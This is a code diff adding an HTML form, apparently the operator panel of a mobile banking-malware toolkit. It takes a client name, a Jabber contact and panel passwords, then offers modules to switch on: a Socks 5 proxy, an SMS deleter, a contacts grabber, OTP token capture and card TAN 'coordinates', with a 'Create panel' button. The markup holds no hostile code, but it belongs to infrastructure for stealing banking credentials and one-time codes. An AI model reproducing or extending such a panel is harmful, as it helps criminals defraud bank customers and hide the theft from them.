@@ -1,0 +1,106 @@
+
+<form method='post'>
+	
+<div class="box grid_6">
+	<div class="box-head"><h2>Main info</h2></div>
+
+	<div class="box-content">
+		
+		<div class="form-row">
+			<p class="form-label">Light mode</p>
+			<input name="mods[light]" type="checkbox" class="iphone-check" />
+		</div>
+		
+		<div class="form-row">
+			<p class="form-label">ID</p>
+			<div class="form-item"><input type="text" name="id" value="%ID%" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">Client name</p>
+			<div class="form-item"><input id="name" type="text" name="name" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">Jabber</p>
+			<div class="form-item"><input id="jabber" type="text" name="jabber" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">Folder name</p>
+			<div class="form-item"><input type="text" name="folder" value="%FOLDER%" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">Basic password</p>
+			<div class="form-item"><input type="text" name="basic_pass" value="%BASIC_PASS%" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">Admin password</p>
+			<div class="form-item"><input type="text" name="admin_pass" value="%ADMIN_PASS%" /></div>
+		</div>
+		<div class="form-row">
+			<p class="form-label">DB password</p>
+			<div class="form-item"><input type="text" name="db_pass" value="%DB_PASS%" /></div>
+		</div>
+		
+		<div class="clear"></div>
+	</div>
+	
+</div>
+<div class="box grid_6">
+
+	<div class="box-head"><h2>Add mods</h2></div>
+
+	<div class="box-content">
+
+	<div class="form-row">
+		<p class="form-label">Socks 5</p>
+		<input name="mods[socks]" type="checkbox" class="iphone-check" />
+	</div>
+
+	<div class="form-row">
+		<p class="form-label">SMS Deleter</p>
+		<input name="mods[sms_deleter]" type="checkbox" class="iphone-check" />
+	</div>
+
+	<div class="form-row">
+		<p class="form-label">Contacts grabber</p>
+		<input name="mods[contacts]" type="checkbox" class="iphone-check" />
+	</div>
+
+	<div class="form-row">
+		<p class="form-label">Tokens</p>
+		<input name="mods[otp_tokens]" type="checkbox" class="iphone-check" />
+	</div>
+
+	<div class="form-row">
+		<p class="form-label">Coordinates</p>
+		<input name="mods[cardtan]" type="checkbox" class="iphone-check" />
+	</div>
+
+		<div class="form-row" style='text-align: center'>
+			 <input type="submit" class="button blue" value="Create panel" />
+		</div>		
+		<div class="clear"></div>
+	</div>
+	
+</div>
+</form>
+<div class="clear"></div>
+
+<script>
+function on_load()
+{
+	$('#name').focus();
+	$('#iphone-check').iphoneStyle();
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
